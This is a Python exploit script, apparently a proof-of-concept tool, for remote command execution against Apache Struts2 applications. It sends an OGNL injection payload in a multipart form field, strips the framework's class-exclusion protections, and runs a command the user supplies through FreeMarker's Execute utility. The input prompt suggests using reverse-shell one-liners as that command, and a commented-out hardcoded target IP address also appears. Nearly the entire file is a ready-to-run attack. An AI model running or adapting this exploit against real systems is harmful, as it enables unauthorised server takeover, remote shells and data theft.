#encoding=utf-8
#god_mellon
import requests
import re
import os
import sys
import base64
import urllib
from collections import OrderedDict
from urllib3 import encode_multipart_formdata
url=input('请输入目标地址：')
cmd=input('请输入要执行的命令：\n反弹shell可以在https://www.ddosi.org/shell/：')
a='%{(#instancemanager=#application["org.apache.tomcat.InstanceManager"]).(#stack=#attr["com.opensymphony.xwork2.util.ValueStack.ValueStack"]).(#bean=#instancemanager.newInstance("org.apache.commons.collections.BeanMap")).(#bean.setBean(#stack)).(#context=#bean.get("context")).(#bean.setBean(#context)).(#macc=#bean.get("memberAccess")).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance("java.util.HashSet")).(#bean.put("excludedClasses",#emptyset)).(#bean.put("excludedPackageNames",#emptyset)).(#arglist=#instancemanager.newInstance("java.util.ArrayList")).(#arglist.add("'+cmd+'")).(#execute=#instancemanager.newInstance("freemarker.template.utility.Execute")).(#execute.exec(#arglist))}'
#url ='http://49.232.201.130:8080/'
params=OrderedDict([("id", (None, a, 'multipart/form-data'))])
m = encode_multipart_formdata(params, boundary='----WebKitFormBoundaryKPjN0GYtWEjAni5F')
x=m[0]
#print(m[0])
headers = {'Content-Type': 'multipart/form-data;boundary=----WebKitFormBoundaryKPjN0GYtWEjAni5F' }
#x='''b'------WebKitFormBoundaryKPjN0GYtWEjAni5F\r\nContent-Disposition: form-data; name="id"\r\nContent-Type: multipart/form-data\r\n\r\n%{(#instancemanager=#application["org.apache.tomcat.InstanceManager"]).(#stack=#attr["com.opensymphony.xwork2.util.ValueStack.ValueStack"]).(#bean=#instancemanager.newInstance("org.apache.commons.collections.BeanMap")).(#bean.setBean(#stack)).(#context=#bean.get("context")).(#bean.setBean(#context)).(#macc=#bean.get("memberAccess")).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance("java.util.HashSet")).(#bean.put("excludedClasses",#emptyset)).(#bean.put("excludedPackageNames",#emptyset)).(#arglist=#instancemanager.newInstance("java.util.ArrayList")).(#arglist.add("id")).(#execute=#instancemanager.newInstance("freemarker.template.utility.Execute")).(#execute.exec(#arglist))}\r\n------WebKitFormBoundaryKPjN0GYtWEjAni5F--\r\n'
#'''

def poc(input_url):

    resp=requests.post(url=input_url,data=x,headers = {'Content-Type': 'multipart/form-data;boundary=----WebKitFormBoundaryKPjN0GYtWEjAni5F' })
    resp=resp.text
    a = 'id' + '="'
    pattern=re.compile(r'<a.*')
    resp_a=pattern.findall(resp)
    resp_a=''.join(resp_a)
    resp_rm_a= re.sub(r"<a", ' ', resp_a)
    resp_rm_a=''.join(resp_rm_a)
    resp_rm_yin= re.sub(a,' ', resp_rm_a)
    print('命令执行完成,部分多行命令无回显>>>>',resp_rm_yin)
    print()
    print()
    print()
    sys.exit()

#resp=requests.post(url=url,data=x,headers = {'Content-Type': 'multipart/form-data;boundary=----WebKitFormBoundaryKPjN0GYtWEjAni5F' })
#print(resp.request.headers)
#print(resp.request.body)
#print(resp.text)

if __name__ == '__main__':
    poc(url)

'''第二波'''

# import requests
# import re
# import sys
# import base64
# import urllib
# from collections import OrderedDict
# from urllib3 import encode_multipart_formdata
# url ='http://49.232.201.130:8080/'
# a='%{(#instancemanager=#application["org.apache.tomcat.InstanceManager"]).(#stack=#attr["com.opensymphony.xwork2.util.ValueStack.ValueStack"]).(#bean=#instancemanager.newInstance("org.apache.commons.collections.BeanMap")).(#bean.setBean(#stack)).(#context=#bean.get("context")).(#bean.setBean(#context)).(#macc=#bean.get("memberAccess")).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance("java.util.HashSet")).(#bean.put("excludedClasses",#emptyset)).(#bean.put("excludedPackageNames",#emptyset)).(#arglist=#instancemanager.newInstance("java.util.ArrayList")).(#arglist.add("id")).(#execute=#instancemanager.newInstance("freemarker.template.utility.Execute")).(#execute.exec(#arglist))}'
# data={'id':a}
# headers = {'Content-Type': 'multipart/form-data;boundary=----WebKitFormBoundaryKPjN0GYtWEjAni5F'}
# re=requests.post(url,data=x,headers=headers)
# print(re.text)